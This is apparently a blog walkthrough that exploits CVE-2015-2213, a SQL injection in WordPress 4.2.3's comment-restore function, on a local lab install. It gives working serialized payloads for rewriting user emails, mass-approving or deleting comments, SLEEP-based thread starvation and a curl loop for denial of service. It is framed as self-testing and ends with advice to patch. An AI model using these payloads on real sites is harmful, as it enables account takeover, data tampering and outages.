### Let's SQL Inject WordPress! (v 4.2.3)

If you're not subscribed to a security mailing list it means you often don't
know when the site you run might be vulnerable. But even when you're on them
sometimes you wonder how vulnerable your site actually is. After all, out of 
all the sites out there, "who would attack me?" is a prevailing mindset. But no 
matter what your mindset, it's good to take a few moments out of your day to 
see how vulnerable your system is.

So today I decided to see if I could use a security mailing list report to 
backdoor a wordpress installation. First off, we need wordpress, so go to
[the release archive] and download version 4.2.3. This version is affected 
by a [lack of sanitation here]. Secondly let's get setup on our local 
machine.

**Apache Virtual host to test**

	<VirtualHost *:80>
	    Servername local.wordpress.sec
	    ErrorLog /tmp/error.log
	    DocumentRoot /path/to/downloaded/wordpress
	    <Directory /path/to/downloaded/wordpress >
	        Options Indexes FollowSymLinks MultiViews
	        AllowOverride All
	        Order allow,deny
	        allow from all
	    </Directory>
	</VirtualHost>

**/etc/hosts file update**

	127.0.0.1 local.wordpress.sec

**MySQL database**

	$ mysql -u root -p
	Enter password: 
	Welcome to the MySQL monitor.  Commands end with ; or \g.
	Your MySQL connection id is 3
	Server version: 5.6.16-log MySQL Community Server (GPL)
	
	Copyright (c) 2000, 2013, Oracle and/or its affiliates. All rights reserved.
	
	Oracle is a registered trademark of Oracle Corporation and/or its
	affiliates. Other names may be trademarks of their respective
	owners.
	
	Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
	
	mysql> create database hackedsite;
	Query OK, 1 row affected (0.03 sec)

Once this is done, navigate to http://local.wordpress.sec in your browser and 
you should be greeted by the usual wordpress screen:

![The Wordpress install page](/images/tech-blog/hacked/1.jpg)

Run through the instructions, setting up a wp-config.php file if neccesary, 
and enter your site information:

![The Wordpress setup page](/images/tech-blog/hacked/2.jpg)

Now that that's setup, we can begin utilizing our knowledge about [the bug CVE-2015-2213]
to compromise the site. The bug occurs in the `wp_untrash_post_comments` function,
which from its name and the documentation around it, restores comments that have 
been trashed due to the related post being trashed. Here's the vulnerable code:

	foreach ( $group_by_status as $status => $comments ) {
		// Sanity check. This shouldn't happen.
		if ( 'post-trashed' == $status )
			$status = '0';
		$comments_in = implode( "', '", $comments );
		$wpdb->query( "UPDATE $wpdb->comments SET comment_approved = '$status' WHERE comment_ID IN ('" . $comments_in . "')" );
	}

To restore a comment we simply change it to be unapproved again and delete some 
post meta information. The issue of course lies in the `implode` on the `$comments` 
variable. Where does `$comments` come from? The `$group_by_status` variable, 
which comes from:

	// Restore each comment to its original status.
	$group_by_status = array();
	foreach ( $statuses as $comment_id => $comment_status )
		$group_by_status[$comment_status][] = $comment_id;

which comes from the `$statuses` variable. Which comes from:

	$statuses = get_post_meta($post_id, '_wp_trash_meta_comments_status', true);

Which ultimately comes from the database's postmeta table. The issue is that 
we expect numeric ID's, but the postmeta can hold anything due to WordPress's 
[long and skinny design]. So let's get to injecting. First, we post 
a comment on the blog:

![Leaving a comment on the blog](/images/tech-blog/hacked/3.jpg)

And later on an administrator deletes the post:

![Deleting a post on the site](/images/tech-blog/hacked/4.jpg)

And we now see the vulnerable field in the database ready for the taking:

	mysql> select * from wp_postmeta;
	+---------+---------+--------------------------------+--------------------------------+
	| meta_id | post_id | meta_key                       | meta_value                     |
	+---------+---------+--------------------------------+--------------------------------+
	|       1 |       2 | _wp_page_template              | default                        |
	|       2 |       1 | _wp_trash_meta_status          | publish                        |
	|       3 |       1 | _wp_trash_meta_time            | 1440362401                     |
	|       4 |       1 | _wp_trash_meta_comments_status | a:2:{i:1;s:1:"1";i:2;s:1:"1";} |
	+---------+---------+--------------------------------+--------------------------------+
	
As you can tell, the `_wp_trash_meta_comments_status` field is a serialized PHP
array. Now let's assume you've compromised the website in some way and managed 
to get database access. So assuming you're able to modify that meta value in 
some way, we can cause an injection.

Let's say we change the meta_value to deserialize to an array like this:
	
	array("'); SELECT ('hi" => 0);

This is a simple [SQL Injection], and when ran through the code will result in 
a query going to the database like this: 

	UPDATE wp_comments SET comment_approved = 0 WHERE comment_ID IN (''); SELECT ('hi');

Which if you run in your MySQL shell will result in a simple hi being returned. 
So could this be used to backdoor or do something malicious? Simple:

	array("'); UPDATE wp_users set user_email = ('myemail@example.com" => "1")

Will result in the query to the database:

	UPDATE wp_comments SET comment_approved = 1 WHERE comment_ID IN (''); UPDATE wp_users set user_email = ('myemail@example.com')

And now every single user account's email is set to yours! Of course, you could 
make this a bit less noticeable by targetting a single account. The obvious being 
ID=1, the admin account that will likely exist on every wordpress site out there. 
Plan drawn, let's see it in practice! First, serializing our attack array:

	$ php -a 
	php > $comments = array("'); UPDATE wp_users set user_email = ('1qdzqk+bzlrxxfbjpnvk@sharklasers.com" => 1);
	php > print serialize($comments);
	a:1:{s:75:"'); UPDATE wp_users set user_email = ('1qdzqk+bzlrxxfbjpnvk@sharklasers.com";i:1;}

And then using the database access you have, we can insert a backdoor:

	 UPDATE wp_postmeta SET meta_value = "a:1:{s:75:\"'); UPDATE wp_users set user_email = ('1qdzqk+bzlrxxfbjpnvk@sharklasers.com\";i:1;}" WHERE meta_key = '_wp_trash_meta_comments_status' AND post_id = 1;

To check if this works, let's examine the database before:

	mysql> update wp_users set user_email = '';
	Query OK, 0 rows affected (0.05 sec)
	Rows matched: 1  Changed: 0  Warnings: 0

	mysql> select * from wp_users;
	+----+------------+------------------------------------+---------------+------------+----------+---------------------+---------------------+-------------+--------------+
	| ID | user_login | user_pass                          | user_nicename | user_email | user_url | user_registered     | user_activation_key | user_status | display_name |
	+----+------------+------------------------------------+---------------+------------+----------+---------------------+---------------------+-------------+--------------+
	|  1 | admin      | $P$By9vOxgjlDv/ZVc3P6RCkm2ODy.dnG. | admin         |            |          | 2015-08-23 20:20:42 |                     |           0 | admin        |
	+----+------------+------------------------------------+---------------+------------+----------+---------------------+---------------------+-------------+--------------+
	1 row in set (0.00 sec)

Then undelete the post:

![Undeleting a post on the site](/images/tech-blog/hacked/5.jpg)

And nothing will happen! Why? Because by default WordPress use's mysqli, which 
doesn't support multiple statements being executed at the same time. So can we 
get around this? MySQL supports flags for executing multiple queries after all.

	define('MYSQL_CLIENT_FLAGS', 65536);

and now when we connect to MySQL we'll have the proper flags to have multiple 
query support turned on. However, [mysql_query] doesn't support more than one 
statement at a time. So you're still going to just make noise in the log:

	WordPress database error You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'UPDATE wp_users set user_email = ('1qdzqk+bzlrxxfbjpnvk@sharklasers.com')' at line 1 for query UPDATE wp_comments SET comment_approved = '1' WHERE comment_ID IN (''); UPDATE wp_users set user_email = ('1qdzqk+bzlrxxfbjpnvk@sharklasers.com') made by wp_untrash_post, wp_untrash_post_comments, referer: http://local.wordpress.sec/wp-admin/edit.php?post_status=trash&post_type=post

If wordpress used [multi-query] this would work. But since they don't support that 
and probably won't in the future due to it's dangerous nature, it seems that the
most that someone could do with this bug is make noise in the logfile. Also, since
the injection attack requires access to the database to setup in the first place, 
it's highly unlikely to run into it from an outside attacker. Plus, in my testing 
it really requires some very specific information and events to happen:

1. An admin or editor must make a post
2. Someone must comment on that post
3. An admin or editor must delete the post (not the comment, the post!)
4. While the post is in the trash, the attacker must update the database as above
5. The key in the attack array is the injected SQL, and the value is the status the comment will have set
6. An admin or editor must restore the post from the trash to trigger the injection

So all in all. A rather unlikely attack vector. But an interesting one to look at
nonetheless. So, how _can_ we use this as a serious attack? Well, besides filling 
up a server's disk space with log errors, we could look at the ramifications of 
screwing up the query itself. For example, right now this is the query that is 
sent: 

	UPDATE wp_comments 
		SET comment_approved = INJECTABLE 
	WHERE comment_ID IN ('INJECTABLE')

So what if we did this: 

	UPDATE wp_comments 
		SET comment_approved = 1 
	WHERE comment_ID in ('1') OR ('1' = '1');

This is within our power by simply serializing the following array and executing a query:

	$comments = array("1') OR ('1'='1" => 1);
	UPDATE wp_postmeta SET meta_value = "a:1:{s:14:\"1') OR ('1'='1\";i:1;}" WHERE meta_key = '_wp_trash_meta_comments_status' 

When ran, this would cause _every_ comment on the _entire_ site to be approved. If you 
were to spam a website and create thousands of comments across the site, then execute 
that query. You would increase the load on the server whenever rendering the wordpress
commments. In the same way, if you instead had the value of the attack array be 0, 
you would remove every comment on the entire site. Destroying all discussion and 
causing massive work on the administrators part to seperate the spam from real content.

This isn't the only way we can attempt to take down a site though. Here's a
devil-ishly simple one:

	$comments = array("1') OR SLEEP('9" => 1);

Which will cause the query to stay open.

	mysql> show processlist;
	+-----+------+-----------+------------+---------+------+------------+---------------------------------------------------------------------------------------+
	| Id  | User | Host      | db         | Command | Time | State      | Info                                                                                  |
	+-----+------+-----------+------------+---------+------+------------+---------------------------------------------------------------------------------------+
	| 831 | root | localhost | hackedsite | Query   |    0 | init       | show processlist                                                                      |
	| 841 | root | localhost | hackedsite | Query   |   39 | User sleep | UPDATE wp_comments SET comment_approved = '1' WHERE comment_ID IN ('1') OR SLEEP('9') |
	+-----+------+-----------+------------+---------+------+------------+---------------------------------------------------------------------------------------+

If you did this enough times, you could cause starvation to the website and it could 
run out of database threads to use. Causing a DoS attack. Take note of the code again:

	foreach ( $group_by_status as $status => $comments ) {
		// Sanity check. This shouldn't happen.
		if ( 'post-trashed' == $status )
			$status = '0';
		$comments_in = implode( "', '", $comments );
		$x = $wpdb->query( "UPDATE $wpdb->comments SET comment_approved = '$status' WHERE comment_ID IN ('" . $comments_in . "');" );
	}

We see that we're _looping_ this update query for each status. On my local host,
the max connection setting is set to 64. So we'll construct an array like so:

	php > $foo = array();
	php > for($i = 0; $i < 66; $i++) $foo["1') OR SLEEP('$i"] = $i;
	php > print_r($foo);
	Array
	(
	    [1') OR SLEEP('0] => 0
	    [1') OR SLEEP('1] => 1
	    [1') OR SLEEP('2] => 2
	    [1') OR SLEEP('3] => 3
	... etc

	print addslashes(serialize($foo));
	a:66:{s:15:\"1\') OR SLEEP(\'0\";i:0;s:15:\"1\') OR SLEEP(\'1\";i:1;s:15:\"1\') OR SLEEP(\'2\";i:2;s:15:\"1\') OR SLEEP(\'3\";i:3;s:15:\"1\') OR SLEEP(\'4\";i:4;s:15:\"1\') OR SLEEP(\'5\";i:5;s:15:\"1\') OR SLEEP(\'6\";i:6;s:15:\"1\') OR SLEEP(\'7\";i:7;s:15:\"1\') OR SLEEP(\'8\";i:8;s:15:\"1\') OR SLEEP(\'9\";i:9;s:16:\"1\') OR SLEEP(\'10\";i:10;s:16:\"1\') OR SLEEP(\'11\";i:11;s:16:\"1\') OR SLEEP(\'12\";i:12;s:16:\"1\') OR SLEEP(\'13\";i:13;s:16:\"1\') OR SLEEP(\'14\";i:14;s:16:\"1\') OR SLEEP(\'15\";i:15;s:16:\"1\') OR SLEEP(\'16\";i:16;s:16:\"1\') OR SLEEP(\'17\";i:17;s:16:\"1\') OR SLEEP(\'18\";i:18;s:16:\"1\') OR SLEEP(\'19\";i:19;s:16:\"1\') OR SLEEP(\'20\";i:20;s:16:\"1\') OR SLEEP(\'21\";i:21;s:16:\"1\') OR SLEEP(\'22\";i:22;s:16:\"1\') OR SLEEP(\'23\";i:23;s:16:\"1\') OR SLEEP(\'24\";i:24;s:16:\"1\') OR SLEEP(\'25\";i:25;s:16:\"1\') OR SLEEP(\'26\";i:26;s:16:\"1\') OR SLEEP(\'27\";i:27;s:16:\"1\') OR SLEEP(\'28\";i:28;s:16:\"1\') OR SLEEP(\'29\";i:29;s:16:\"1\') OR SLEEP(\'30\";i:30;s:16:\"1\') OR SLEEP(\'31\";i:31;s:16:\"1\') OR SLEEP(\'32\";i:32;s:16:\"1\') OR SLEEP(\'33\";i:33;s:16:\"1\') OR SLEEP(\'34\";i:34;s:16:\"1\') OR SLEEP(\'35\";i:35;s:16:\"1\') OR SLEEP(\'36\";i:36;s:16:\"1\') OR SLEEP(\'37\";i:37;s:16:\"1\') OR SLEEP(\'38\";i:38;s:16:\"1\') OR SLEEP(\'39\";i:39;s:16:\"1\') OR SLEEP(\'40\";i:40;s:16:\"1\') OR SLEEP(\'41\";i:41;s:16:\"1\') OR SLEEP(\'42\";i:42;s:16:\"1\') OR SLEEP(\'43\";i:43;s:16:\"1\') OR SLEEP(\'44\";i:44;s:16:\"1\') OR SLEEP(\'45\";i:45;s:16:\"1\') OR SLEEP(\'46\";i:46;s:16:\"1\') OR SLEEP(\'47\";i:47;s:16:\"1\') OR SLEEP(\'48\";i:48;s:16:\"1\') OR SLEEP(\'49\";i:49;s:16:\"1\') OR SLEEP(\'50\";i:50;s:16:\"1\') OR SLEEP(\'51\";i:51;s:16:\"1\') OR SLEEP(\'52\";i:52;s:16:\"1\') OR SLEEP(\'53\";i:53;s:16:\"1\') OR SLEEP(\'54\";i:54;s:16:\"1\') OR SLEEP(\'55\";i:55;s:16:\"1\') OR SLEEP(\'56\";i:56;s:16:\"1\') OR SLEEP(\'57\";i:57;s:16:\"1\') OR SLEEP(\'58\";i:58;s:16:\"1\') OR SLEEP(\'59\";i:59;s:16:\"1\') OR SLEEP(\'60\";i:60;s:16:\"1\') OR SLEEP(\'61\";i:61;s:16:\"1\') OR SLEEP(\'62\";i:62;s:16:\"1\') OR SLEEP(\'63\";i:63;s:16:\"1\') OR SLEEP(\'64\";i:64;s:16:\"1\') OR SLEEP(\'65\";i:65;}

And then insert it as usual when a post is trashed. 

	UPDATE wp_postmeta SET meta_value = "a:66:{s:15:\"1\') OR SLEEP(\'0\";i:0;s:15:\"1\') OR SLEEP(\'1\";i:1;s:15:\"1\') OR SLEEP(\'2\";i:2;s:15:\"1\') OR SLEEP(\'3\";i:3;s:15:\"1\') OR SLEEP(\'4\";i:4;s:15:\"1\') OR SLEEP(\'5\";i:5;s:15:\"1\') OR SLEEP(\'6\";i:6;s:15:\"1\') OR SLEEP(\'7\";i:7;s:15:\"1\') OR SLEEP(\'8\";i:8;s:15:\"1\') OR SLEEP(\'9\";i:9;s:16:\"1\') OR SLEEP(\'10\";i:10;s:16:\"1\') OR SLEEP(\'11\";i:11;s:16:\"1\') OR SLEEP(\'12\";i:12;s:16:\"1\') OR SLEEP(\'13\";i:13;s:16:\"1\') OR SLEEP(\'14\";i:14;s:16:\"1\') OR SLEEP(\'15\";i:15;s:16:\"1\') OR SLEEP(\'16\";i:16;s:16:\"1\') OR SLEEP(\'17\";i:17;s:16:\"1\') OR SLEEP(\'18\";i:18;s:16:\"1\') OR SLEEP(\'19\";i:19;s:16:\"1\') OR SLEEP(\'20\";i:20;s:16:\"1\') OR SLEEP(\'21\";i:21;s:16:\"1\') OR SLEEP(\'22\";i:22;s:16:\"1\') OR SLEEP(\'23\";i:23;s:16:\"1\') OR SLEEP(\'24\";i:24;s:16:\"1\') OR SLEEP(\'25\";i:25;s:16:\"1\') OR SLEEP(\'26\";i:26;s:16:\"1\') OR SLEEP(\'27\";i:27;s:16:\"1\') OR SLEEP(\'28\";i:28;s:16:\"1\') OR SLEEP(\'29\";i:29;s:16:\"1\') OR SLEEP(\'30\";i:30;s:16:\"1\') OR SLEEP(\'31\";i:31;s:16:\"1\') OR SLEEP(\'32\";i:32;s:16:\"1\') OR SLEEP(\'33\";i:33;s:16:\"1\') OR SLEEP(\'34\";i:34;s:16:\"1\') OR SLEEP(\'35\";i:35;s:16:\"1\') OR SLEEP(\'36\";i:36;s:16:\"1\') OR SLEEP(\'37\";i:37;s:16:\"1\') OR SLEEP(\'38\";i:38;s:16:\"1\') OR SLEEP(\'39\";i:39;s:16:\"1\') OR SLEEP(\'40\";i:40;s:16:\"1\') OR SLEEP(\'41\";i:41;s:16:\"1\') OR SLEEP(\'42\";i:42;s:16:\"1\') OR SLEEP(\'43\";i:43;s:16:\"1\') OR SLEEP(\'44\";i:44;s:16:\"1\') OR SLEEP(\'45\";i:45;s:16:\"1\') OR SLEEP(\'46\";i:46;s:16:\"1\') OR SLEEP(\'47\";i:47;s:16:\"1\') OR SLEEP(\'48\";i:48;s:16:\"1\') OR SLEEP(\'49\";i:49;s:16:\"1\') OR SLEEP(\'50\";i:50;s:16:\"1\') OR SLEEP(\'51\";i:51;s:16:\"1\') OR SLEEP(\'52\";i:52;s:16:\"1\') OR SLEEP(\'53\";i:53;s:16:\"1\') OR SLEEP(\'54\";i:54;s:16:\"1\') OR SLEEP(\'55\";i:55;s:16:\"1\') OR SLEEP(\'56\";i:56;s:16:\"1\') OR SLEEP(\'57\";i:57;s:16:\"1\') OR SLEEP(\'58\";i:58;s:16:\"1\') OR SLEEP(\'59\";i:59;s:16:\"1\') OR SLEEP(\'60\";i:60;s:16:\"1\') OR SLEEP(\'61\";i:61;s:16:\"1\') OR SLEEP(\'62\";i:62;s:16:\"1\') OR SLEEP(\'63\";i:63;s:16:\"1\') OR SLEEP(\'64\";i:64;s:16:\"1\') OR SLEEP(\'65\";i:65;}" WHERE meta_key = '_wp_trash_meta_comments_status' 

And you'll now always be eating up MySQL threads that could be used for something 
more productive. With PHP, because the process running the updates is synchronous, 
we only take up one thread though. If the code calling the database was looped 
asynchronously, we'd have a problem as we'd use _all_ the threads. The other 
thing this could do is that if the `wp_comments` table was changed from using
InnoDB to MyISAM we could stop anyone from commenting on the site due to [table locking]. 
Considering this hypothetical attacker can cause those UPDATE's to happen, they
can probably do this:

	mysql> ALTER TABLE wp_comments ENGINE=MyISAM;

Which, when we attempt to open up the web page results in the following:

	mysql> show processlist;
	+-----+------+-----------+------------+---------+------+------------------------------+------------------------------------------------------------------------------------------------------+
	| Id  | User | Host      | db         | Command | Time | State                        | Info                                                                                                 |
	+-----+------+-----------+------------+---------+------+------------------------------+------------------------------------------------------------------------------------------------------+
	| 868 | root | localhost | hackedsite | Query   |    0 | init                         | show processlist                                                                                     |
	| 870 | root | localhost | hackedsite | Query   |   37 | User sleep                   | UPDATE wp_comments SET comment_approved = '9' WHERE comment_ID IN ('1') OR SLEEP('9')                |
	| 894 | root | localhost | hackedsite | Query   |    2 | Waiting for table level lock | SELECT * FROM wp_comments JOIN wp_posts ON wp_posts.ID = wp_comments.comment_post_ID WHERE ( comment |
	+-----+------+-----------+------------+---------+------+------------------------------+------------------------------------------------------------------------------------------------------+
	3 rows in set (0.00 sec)

Then all we have to do is open up 65+ connections:

	$ for i in {0..65}
	> do
	> curl http://local.wordpress.sec/index.php/2015/08/23/hello-world/ &
	> done

And tada! DoS:

![A Successful Denial Of Service Attack](/images/tech-blog/hacked/6.jpg)
![A Successful Denial Of Service Attack](/images/tech-blog/hacked/7.jpg)

`SLEEP`ing a thread will occupy it for a long while, until the timeout for the 
database. So if you wanted this to last until the database was restarted you 
would want to cause an infinite loop with the update. But how would we do this?
Easy! Like this:

	UPDATE wp_comments 
		SET comment_approved = '1', comment_ID = comment_ID + '1' 
	WHERE comment_ID IN ('') OR (comment_ID >= 0 OR '1'='1');

This causes an infinite loop because the index used to solve the `WHERE` 
part of the update is effected by the update itself. And so once the update 
takes place, the updated row will be sorted to another place in the index, 
where it will be updated again. Again, injecting this is easy:

	$comments = array("') OR (comment_ID >= 0 OR '1'='1" => "1', comment_ID = comment_ID + '1")
	UPDATE wp_postmeta SET meta_value = "a:1:{s:32:\"\') OR (comment_ID >= 0 OR \'1\'=\'1\";s:32:\"1\', comment_ID = comment_ID + \'1\";}" WHERE meta_key = '_wp_trash_meta_comments_status';

But luckily for the system, this fails due to primary key errors, and we can't 
inject an [IGNORE] keyword into the query without modifying the source code 
itself. So it seems an infinite loop attack is out of our range given the indices 
on the table, but the `SLEEP` value can easily be made into the thousands range
so it's not actually neccesary for an attack to work.

The other way one could abuse this injection would be to modify the posts the 
comments belong to:

	$comments = array("') OR (comment_post_ID >= 0 OR '1'='1" => "1', comment_post_ID = comment_post_ID + '1")
	UPDATE wp_comments 
		SET comment_approved = '1', comment_post_ID = comment_post_ID + '1' 
	WHERE comment_ID IN ('') OR (comment_post_ID >= 0 OR '1'='1');

Which would cause comments for one post to shift to the next for every single 
post. Causing a massive headache for whoever has to sort them back into order. 
By changing the `+ '1'` to something like `FLOOR(RAND() * 401) + 10000` to shift
the comments around in a random order, an even larger headache could happen. 

Despite this alarming use of the injection attack, it's important to note how 
obscure and unlikely the scenario to cause this has to be. Using a MyISAM table 
for your comments table is, hopefully, an unlikely situation for you to be dealing 
with in the first place. And if an attacker has access to your database to change 
it and do the injection attack in the first place, you have bigger problems. And a 
perfect storm of security flaws is unlikely to be the one occupying your time!

#### Closing thoughts

1. Subscribe to security mailing lists (it's informative, and fun!)
2. Keep your software up to date! (the above issue is fixed in 4.2.4 and up)
3. Take the time to try to exploit your own site with exploits from the mailing lists, it's fun to do on a weekend and will enhance your understanding of your sites vulnerabilities and how to protect it.



[the release archive]:https://wordpress.org/download/release-archive/
[lack of sanitation here]:https://core.trac.wordpress.org/changeset/33556/branches/4.2/src/wp-includes/post.php?contextall=1
[the bug CVE-2015-2213]:https://bugzilla.redhat.com/show_bug.cgi?id=1250583
[long and skinny design]:https://codex.wordpress.org/Database_Description
[SQL Injection]:https://en.wikipedia.org/wiki/SQL_injection
[mysql_query]:https://php.net/manual/en/function.mysql-query.php
[multi-query]:https://secure.php.net/manual/en/mysqli.multi-query.php
[table locking]:https://dev.mysql.com/doc/refman/5.0/en/table-locking.html
[IGNORE]:https://dev.mysql.com/doc/refman/5.0/en/update.html